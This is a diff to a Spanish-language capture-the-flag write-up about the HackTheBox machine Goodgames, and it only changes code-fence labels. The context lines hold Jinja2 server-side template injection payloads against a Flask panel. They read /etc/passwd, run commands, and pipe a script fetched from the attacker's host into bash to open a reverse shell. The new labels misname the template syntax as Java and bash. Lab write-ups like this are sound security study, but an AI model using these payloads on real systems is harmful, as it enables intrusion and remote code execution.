@@ -233,7 +233,7 @@ Veo que usa la tecnología Werkzeug/2.0.2 Python/3.6.7 y usa Flask por lo que co
 
 Lo que pude ver en el panel web es que puedo actualizar el nombre del usuario administrador, por lo que probé diferentes cosas, como por ejemplo un pequeño payload SSTI.
 
-```ssti
+```bash
 # Payload para detectar SSTI
 {{7*7}}
 ```
@@ -244,13 +244,13 @@ Y puedo ver la respuesta en el propio panel web.
 
 Estuve buscando información al respecto y encontré varios payloads que podrían servirme, asique probé uno de ellos para intentar leer el archivo passwd.
 
-```ssti
+```java
 {{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
 ```
 
 A continuación probé un payload para intentar ejecutar comandos
 
-```ssti
+```java
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
 ```
 
@@ -260,7 +260,7 @@ Y funciona, puedo ejecutar comandos en el sistema, por lo que creo una reverse s
 
 ![](/assets/images/HTB/Goodgames-HackTheBox/shell.webp)
 
-```ssti
+```java
 {{request.application.__globals__.__builtins__.__import__('os').popen('curl 10.10.14.5:8081/rev.sh | bash').read()}}
 ```
 
